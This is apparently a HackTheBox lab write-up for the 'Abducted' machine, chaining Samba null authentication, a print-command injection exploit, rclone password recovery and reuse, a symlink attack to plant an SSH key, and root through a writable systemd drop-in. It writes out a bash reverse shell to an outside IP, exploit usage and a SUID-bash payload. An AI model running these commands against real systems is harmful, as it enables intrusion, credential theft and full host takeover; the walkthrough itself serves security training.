---
title: "Abducted @ HackTheBox"
date: 2026-06-25
categories: [HackTheBox, Medium]
tags: [samba, cve-2026-4480, password-reuse, symlink]
image:
  path: /assets/abducted.png
---

Abducted is a Linux machine exposing a Samba instance with null authentication
enabled. Three SMB shares are accessible as a guest — a writable printer share,
a project share, and a staff transfer share. The chain runs from unauthenticated
RCE through a Samba print command injection vulnerability, through credential
reuse and a symlink attack on a misconfigured share, to root via a writable
systemd drop-in directory owned by a group the final user belongs to.

## Enumeration

### Nmap

```bash
➜ nmap 10.129.33.38 -sVC --min-rate 1000

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SMB — Null Authentication

I checked whether null authentication was enabled.

```bash
~> /htb/abducted nxc smb 10.129.33.38 -u ' ' -p ' '
SMB         10.129.33.38    445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.33.38    445    ABDUCTED         [+] ABDUCTED\ :  (Guest) 
```

Null auth works. I enumerated the shares.

```bash
~> /htb/abducted nxc smb 10.129.33.38 -u 'Guest' -p '' --shares
SMB         10.129.33.38    445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.33.38    445    ABDUCTED         [+] ABDUCTED\Guest: (Guest)
SMB         10.129.33.38    445    ABDUCTED         [*] Enumerated shares
SMB         10.129.33.38    445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.33.38    445    ABDUCTED         -----           -----------     ------
SMB         10.129.33.38    445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.33.38    445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.33.38    445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.33.38    445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
```


Three interesting shares. The standout is `HP-Reception` — it's a printer
share and we have **WRITE** access to it as Guest.

---

## Foothold — Shell as nobody

### Samba Print Command Injection (CVE-2026-4480)

CVE-2026-4480 is a critical RCE in Samba's printing subsystem. When a print
job is processed, Samba performs `%J` (job name) substitution in the configured
`print command`. An unauthenticated attacker with write access to a printer
share can inject arbitrary shell commands through a crafted job name.

I set up a listener and ran the PoC against the `HP-Reception` share.

```bash
➜ nc -lnvp 4444

# separate terminal
➜ python3 exploit.py 10.129.33.38 10.10.14.94 4444
[*] target   : 10.129.33.38 (\\10.129.33.38\HP-Reception)
[*] callback : 10.10.14.94:4444
[+] print job submitted -- check your listener
```

<img width="843" height="231" alt="image" src="https://github.com/user-attachments/assets/768d18b7-59ca-4c80-a64e-783faf254d3e" />

### Credential Discovery

Browsing the filesystem I found an rclone configuration at
`/opt/offsite-backup/rclone.conf`.

```bash
nobody@abducted:/opt/offsite-backup$ cat rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

rclone stores passwords obfuscated, not encrypted. There's a built-in `reveal` command to decode it.

```bash
➜ rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw'
iXzvcib3SrpZ
```

---

## Lateral Movement — Shell as scott

There are two users on the box, `marcus` and `scott`. I tried the rclone
password against both with `su`.

```bash
nobody@abducted:/opt/offsite-backup$ su scott
Password: iXzvcib3SrpZ
id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

**User flag**:
```bash
scott@abducted:~$ cat user.txt
ed2a3d0deaed4968e1a1a4836a5f7ac9
```

---

## Lateral Movement — Shell as marcus

### Reading the Share Configuration

Reading `/etc/samba/shares.conf` revealed something interesting about the
`transfer` share.

```bash
scott@abducted:/var/spool/samba$ cat /etc/samba/shares.conf
cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
scott@abducted:/var/spool/samba$ 
```


The `transfer` share has two critical misconfigurations:
- `force user = marcus` — any file operation through this share runs as marcus
- `wide links = yes` — symbolic links pointing outside the share path are
  followed

Scott has access to this share. With those two settings combined, placing a
symlink inside `/srv/transfer` pointing to marcus's home directory gives us
read and write access to it — operating as marcus — through the share.

### Symlink Attack

```bash
scott@abducted:~$ ln -s /home/marcus /srv/transfer/marcus
```

### Uploading an SSH Key

I generated a key pair locally, connected to the transfer share as scott, and
navigated through the symlink into marcus's `.ssh` directory.

```bash
~> /htb/abducted ssh-keygen                           
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/exploit/.ssh/id_ed25519): id_rsa                
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:XAumX3xXUwxmCAf8bkPWSF+XlrjhktWrL5e9o0mn7ys exploit@kali
The key's randomart image is:
+--[ED25519 256]--+
|         .oo..*o+|
|          ..o* ==|
|        o .o+++o+|
|       + + +=ooo.|
|      . S ++o o  |
|       . . .+o   |
|        .  . o..o|
|            .E+=.|
|             +B=+|
+----[SHA256]-----+

~> /htb/abducted smbclient //10.129.33.38/transfer -U 'scott%iXzvcib3SrpZ'

smb: \> cd marcus\.ssh\
smb: \marcus\.ssh\> put id_rsa.pub authorized_keys
```


```bash
➜ ssh marcus@10.129.33.38 -i id_rsa
marcus@abducted:~$ whoami
marcus
```

---

## Privilege Escalation — root via systemd Drop-in

### Group Enumeration

```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Marcus is in the `operators` group. I looked for anything on the filesystem owned by that group.

```bash
marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
```

The drop-in directory for `smbd.service` is group-writable by `operators`. systemd drop-ins are loaded as part of the service unit — any `ExecStartPre` directive inside them runs as root when the service starts.

### First Attempt — Reverse Shell

I wrote a drop-in with a bash reverse shell payload.

```bash
cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.94/1337 >&1'
EOF

marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

The service restart failed, the `ExecStartPre` reverse shell caused the unit to error out before the main process started, which meant the callback never landed cleanly.

### Second Attempt — SUID bash

I switched to a simpler, more reliable payload: set the SUID bit on `/bin/bash`.

```bash
cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF

marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```


```bash
marcus@abducted:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31 2024 /bin/bash

marcus@abducted:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
f6fa04c45fb9764285415eb777d576e5
```
